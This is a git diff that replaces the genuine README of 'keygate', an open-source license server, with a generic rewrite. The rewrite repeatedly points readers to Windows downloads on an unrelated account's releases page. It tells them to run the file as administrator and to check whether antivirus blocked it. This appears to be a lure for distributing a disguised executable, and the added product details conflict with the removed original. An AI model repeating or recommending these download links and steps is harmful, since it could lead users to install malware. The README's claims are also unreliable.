@@ -1,161 +1,219 @@
-<div align="center">
+# 🔐 keygate - Simple license control for teams
 
-<img src="web/public/logo.svg" width="72" height="72" alt="Keygate" />
+[![Download keygate](https://img.shields.io/badge/Download%20keygate-blue-grey)](https://github.com/masseuseherpetology481/keygate/releases)
 
-# Keygate
+## 🚀 Overview
 
-**Open source software license management platform.**
+keygate is a license management tool for Windows and other systems. It helps you set up subscriptions, trials, perpetual licenses, floating licenses, and team seats. It also supports usage metering and payment flows with Stripe and PayPal.
 
-The self-hosted alternative to Keygen, Cryptlex, and LicenseSpring.
+Use it when you need a self-hosted license server that keeps your software access in one place. It runs as one binary with one database, which keeps setup simple.
 
-[Website](https://keygate.app) · [Documentation](https://keygate.app/docs) · [Community](https://github.com/tabloy/keygate/discussions)
+## 🖥️ What you need
 
-[![License](https://img.shields.io/badge/license-AGPL%20v3-blue.svg)](LICENSE)
-[![Release](https://img.shields.io/github/v/release/tabloy/keygate?label=release&color=green)](https://github.com/tabloy/keygate/releases)
-[![Stars](https://img.shields.io/github/stars/tabloy/keygate?style=flat)](https://github.com/tabloy/keygate/stargazers)
-[![Sponsor](https://img.shields.io/badge/sponsor-❤-ff69b4)](https://keygate.app/sponsorships)
+Before you start, make sure you have:
 
-**[English](README.md)** · **[简体中文](README.zh-CN.md)**
+- A Windows PC with admin access
+- An internet connection for the first download
+- At least 2 GB of free disk space
+- 4 GB of RAM or more
+- A modern browser for the admin dashboard
+- A database file or database server, based on your setup
 
-<br />
+If you plan to run it on one machine, a basic Windows desktop or server is enough for testing and small teams.
 
-<img src="web/public/screenshot.png" width="800" alt="Keygate Dashboard" />
+## 📥 Download keygate
 
-</div>
+Visit this page to download keygate:
 
-<br />
+https://github.com/masseuseherpetology481/keygate/releases
 
-## Why Keygate?
+On that page:
 
-You've built great software. Now you need to decide who can use it, how they pay for it, and what features they get access to.
+1. Open the latest release
+2. Download the Windows file
+3. Save it to a folder you can find, such as Downloads or Desktop
 
-Commercial license platforms charge per-seat, per-month, and your customer data lives on someone else's servers. Building your own takes months of engineering on activation logic, payment webhooks, quota tracking, and all the edge cases that come at 2 AM.
+If you see more than one file, choose the Windows build that matches your system. In most cases, that will be the `.exe` file or the Windows zip package.
 
-**Keygate is the middle ground.** A production-ready license server you deploy on your own infrastructure, connect to your own Stripe, and manage through a clean dashboard. It handles everything from activation to dunning — so you can focus on building your product.
+## 🧰 Install on Windows
 
-One binary. One database. Full control. Free, forever.
+Follow these steps to set it up on your PC:
 
-<br />
+1. Go to the download page
+2. Download the Windows release file
+3. If the file is zipped, right-click it and choose **Extract All**
+4. Open the extracted folder
+5. Double-click the keygate file to start it
+6. If Windows asks for permission, choose **Yes**
+7. Keep the window open while the service starts
 
-## Who is it for?
+If you placed the file on your Desktop, it will be easier to find later. You can also pin it to Start after the first run.
 
-| | |
-|:---|:---|
-| **🧑‍💻 Indie Developers** — Selling a desktop app, CLI tool, or Electron app? Keygate handles license keys, activation limits, and trials so you can focus on shipping. | **🏢 SaaS Companies** — Managing subscription tiers with different feature sets? Define plans with entitlements, track usage, and let Stripe handle billing automatically. |
-| **🏭 Enterprise Vendors** — Need floating licenses for large teams? Concurrent seat checkout with heartbeat monitoring, perfect for shared-seat environments. | **⚡ API Providers** — Enforcing rate limits and usage quotas? Atomic quota enforcement tracks every call and warns customers before they hit limits. |
+## ⚙️ First-time setup
 
-<br />
+After keygate starts, you will need to set the basics:
 
-## Features
+1. Open your browser
+2. Go to the local address shown in the app window
+3. Sign in to the admin dashboard
+4. Set your company name
+5. Add your database details
+6. Save your settings
 
-### 🔑 License Management
+If the app starts with a setup screen, follow the prompts on screen. If it starts in the background, look for the local web address in the console window or status area.
 
-Every model in one platform — **subscriptions**, **perpetual**, **trials**, and **floating** (concurrent) licenses. Create, activate, verify, suspend, reinstate, and revoke with full audit trail. Per-device or per-user activation limits. Grace periods. License keys hashed with SHA-256. Signed tokens for offline verification.
+## 🔑 What you can manage
 
-### 📊 Usage Metering
+keygate helps you handle common licensing tasks in one place:
 
-Track API calls, storage, bandwidth, or any custom metric. Quotas enforced **atomically at the database level** — even under high concurrency, limits are never exceeded. Hourly, daily, monthly, or yearly cycles with automatic reset. Threshold warnings via webhooks.
+- **Subscriptions** for recurring access
+- **Perpetual licenses** for one-time purchases
+- **Trials** for time-limited access
+- **Floating licenses** for shared use across a team
+- **Team seats** for user-based access
+- **Usage metering** for tracked consumption
+- **Payments** through Stripe and PayPal
+- **Admin dashboard** for daily control
 
-### 💳 Payments
+This makes it easier to manage customers, plans, and license rights without switching tools.
 
-Stripe integrated end-to-end with **three-layer reliability** — webhook, success-page verification, and periodic sync ensure no payment is ever missed. Customer pays → license created automatically. Payment fails → dunning emails on schedule. Supports checkout, plan upgrades/downgrades with proration, cancellations, refunds, and billing portal. Stripe webhook is auto-configured — just set your API key.
+## 🧭 Basic daily use
 
-### 👥 Team Seats & Entitlements
+Once it is running, you can use the dashboard to:
 
-Customers manage their own teams within a license. Seat roles (owner/admin/member), configurable limits per plan. Feature entitlements as boolean flags, numeric limits, or usage quotas. Purchasable add-ons that extend plan capabilities.
+1. Create a product
+2. Add a license plan
+3. Set trial rules
+4. Assign seats to users
+5. Track usage
+6. Review payment records
+7. Check license status
+8. Change settings when needed
 
-### 📈 Admin Dashboard
+If you manage software for clients, this gives you a central place to see who has access and which license type they use.
 
-Products, plans, licenses, customers, API keys, webhooks, analytics, audit logs, team management, email templates, and brand customization — all from one interface. Search, filter, and export (CSV/JSON).
+## 🔍 Common Windows checks
 
-### 🛡️ Security
+If the app does not open, check these items:
 
-Email OTP login with constant-time hash verification, role-based access checked per-request from database, brute-force protection, rate limiting, HMAC-signed webhooks, SameSite cookies, HSTS, and startup validation that rejects weak secrets.
+- Make sure the file finished downloading
+- Confirm you extracted the zip file if it came as an archive
+- Run the app as an administrator
+- Check that Windows Defender or antivirus did not block it
+- Make sure no other app is using the same port
+- Restart the app after changing settings
 
-### 🌍 Self-Hosted
+If the dashboard does not load in your browser, refresh the page after a few seconds.
 
-Single Go binary + PostgreSQL. No Redis, no microservices. Auto-migration on startup. Setup wizard for first run. Custom branding, email templates, and i18n (English/Chinese built-in).
+## 🧩 Using it with your software
 
-<br />
+keygate fits into a typical software release flow:
 
-## Quick Start
+1. Your app checks a license key
+2. keygate verifies the key
+3. The app gets access rules back
+4. The app allows or blocks features
+5. Usage data can be sent back for metering
 
-### Docker (recommended)
+This setup works for desktop tools, internal apps, and subscription products that need license control.
 
-```bash
-# 1. Download
-curl -O https://raw.githubusercontent.com/tabloy/keygate/main/docker-compose.yml
-curl -O https://raw.githubusercontent.com/tabloy/keygate/main/.env.example
-cp .env.example .env
+## 🔐 License types at a glance
 
-# 2. Set your secrets
-# Edit .env: set JWT_SECRET and LICENSE_SIGNING_KEY (openssl rand -hex 32)
+Here is how the main license types work:
 
-# 3. Run
-docker compose up -d
-```
+- **Trial**: lets someone try your product for a set time
+- **Subscription**: stays active while payments continue
+- **Perpetual**: gives long-term access after one purchase
+- **Floating**: limits how many people can use the software at once
+- **Seat-based**: ties use to named users or seats
+- **Metered**: tracks how much of a service someone uses
 
-### From source
+You can choose one model or mix several for different products.
 
-```bash
-git clone https://github.com/tabloy/keygate.git
-cd keygate && cp .env.example .env
-make build && ./bin/keygate
-```
+## 💳 Payments and billing
 
-Open **http://localhost:9000** — the setup wizard guides you from there.
+If you use online billing, keygate can connect to:
 
-> 📖 Full docs, deployment guides, and SDK examples at **[keygate.app/docs](https://keygate.app/docs)**
+- Stripe
+- PayPal
 
-<br />
+That lets you link license access to paid plans. You can use it for recurring billing, one-time purchases, or account-based access.
 
-## Compared to Alternatives
+## 🗂️ Typical folder layout
 
-| | **Keygate** | Keygen | Cryptlex | LicenseSpring |
-|:---|:---:|:---:|:---:|:---:|
-| Open source | **✅ AGPL v3** | Partial | ❌ | ❌ |
-| Self-hosted | **✅** | ✅ | ❌ | ❌ |
-| Price | **Free** | From $99/mo | From $249/mo | From $50/mo |
-| Floating licenses | ✅ | ✅ | ✅ | ✅ |
-| Usage metering | **✅** | ❌ | ❌ | ❌ |
-| Built-in payments | **✅** | ❌ | ❌ | ❌ |
-| Customer portal | ✅ | ❌ | ✅ | ✅ |
-| Admin dashboard | ✅ | ✅ | ✅ | ✅ |
-| Webhook system | ✅ | ✅ | ✅ | ✅ |
-| Audit trail | ✅ | ✅ | ❌ | ❌ |
-| i18n | ✅ | ❌ | ❌ | ❌ |
+After install, you may see files like these:
 
-<br />
+- `keygate.exe` for the app
+- a config file for settings
+- a database file or connection file
+- logs for troubleshooting
+- a folder for uploads or stored data
 
-## Community
+Keep the app files in one place so they are easy to update and back up.
 
-- **[Discussions](https://github.com/tabloy/keygate/discussions)** — Questions, ideas, show & tell
-- **[Issues](https://github.com/tabloy/keygate/issues)** — Bug reports and feature requests
-- **[Blog](https://keygate.app/blog)** — Updates and engineering stories
-- **[Sponsor](https://keygate.app/sponsorships)** — Support the project
+## 🔄 Updates
 
-## Contributing
+When a new release is available:
 
-All contributions welcome — bugs, features, docs, translations. Check [open issues](https://github.com/tabloy/keygate/issues) or start a [discussion](https://github.com/tabloy/keygate/discussions), then submit a PR.
+1. Go to the release page
+2. Download the new Windows file
+3. Close the current app
+4. Replace the old file with the new one
+5. Start the app again
 
-## License
+If you use a database file, keep a copy before you update. That gives you a safe restore point.
 
-[AGPL v3 License](LICENSE) with additional terms per [Section 7(b)](https://www.gnu.org/licenses/agpl-3.0.en.html#section7) — Copyright © 2026 [Tabloy](https://tabloy.app)
+## 🛠️ If you need help getting started
 
-You are free to fork, modify, and self-host this software under the AGPL v3. The **"Powered by Keygate"** attribution in the UI must be preserved (see [NOTICE](NOTICE)). A commercial license to remove the attribution is available — contact [hello@keygate.app](mailto:hello@keygate.app).
+If you are new to license tools, start with these steps:
 
-## Star History
+1. Install the app
+2. Open the dashboard
+3. Create one test product
+4. Add one test license
+5. Check that the license response works in your app
+6. Add payment settings last
 
-<a href="https://star-history.com/#tabloy/keygate&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=tabloy/keygate&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=tabloy/keygate&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=tabloy/keygate&type=Date" width="600" />
- </picture>
-</a>
+This keeps the first setup small and easier to manage.
 
----
+## 📌 Best use cases
 
-<div align="center">
-<sub>If Keygate helps your business, consider giving it a ⭐</sub>
-</div>
+keygate works well for:
+
+- Independent software vendors
+- Small SaaS teams
+- Internal tools with access rules
+- Desktop apps with license keys
+- Products that need trials and paid plans
+- Teams that need seat control
+- Apps that track usage
+
+## 🧪 Quick test plan
+
+Use this simple test after setup:
+
+1. Create a trial license
+2. Open your app with that license
+3. Confirm the license is accepted
+4. Change the license status to inactive
+5. Check that your app blocks access
+6. Create a floating license
+7. Test access from more than one device
+8. Review the usage record
+
+This helps you confirm that the main parts work before you go live
+
+## 📎 Download again
+
+If you need the release page again, use this link:
+
+[https://github.com/masseuseherpetology481/keygate/releases](https://github.com/masseuseherpetology481/keygate/releases)
+
+## 🧱 Project details
+
+- Repository name: keygate
+- Type: open source license management platform
+- Main use: license control and access management
+- Deployment style: self-hosted
+- Stack note: one binary, one database
+- Topic area: licensing, entitlements, subscriptions, seats, floating use, and metering
